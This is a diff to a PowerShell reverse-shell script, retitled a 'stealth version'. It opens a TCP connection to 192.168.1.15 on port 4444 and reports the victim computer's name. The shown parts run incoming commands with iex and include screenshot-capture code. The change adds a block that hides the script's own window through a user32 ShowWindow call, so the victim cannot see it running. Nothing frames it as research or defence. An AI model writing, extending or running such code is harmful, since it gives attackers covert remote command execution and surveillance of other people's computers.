@@ -1,6 +1,13 @@
-# --- ATOMIC LOCK-IN ---
+# --- ATOMIC LOCK-IN (STEALTH VERSION) ---
 $ip = '192.168.1.15'
 $port = 4444
+
+# --- NEW: HIDE WINDOW ON START ---
+$h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+$type = Add-Type -MemberDefinition $h -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
+$hwnd = (Get-Process -Id $PID).MainWindowHandle
+if ($hwnd -ne 0) { $type::ShowWindow($hwnd, 0) } # 0 = SW_HIDE
+# --------------------------------
 
 # 1. SIMPLEST CONNECTION
 $c = New-Object System.Net.Sockets.TCPClient
@@ -10,7 +17,7 @@ $r = New-Object System.IO.StreamReader($s)
 $w = New-Object System.IO.StreamWriter($s)
 $w.AutoFlush = $true
 
-$w.WriteLine("--- ACCESS GRANTED TO: $env:COMPUTERNAME ---")
+$w.WriteLine("--- STEALTH ACCESS GRANTED: $env:COMPUTERNAME ---")
 
 # 2. THE ONLY LOOP
 while($c.Connected) {
@@ -34,7 +41,6 @@ while($c.Connected) {
         $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
     } 
     else {
-        # The most basic way to run a command
         $out = iex $cmd 2>&1 | Out-String
     }
 
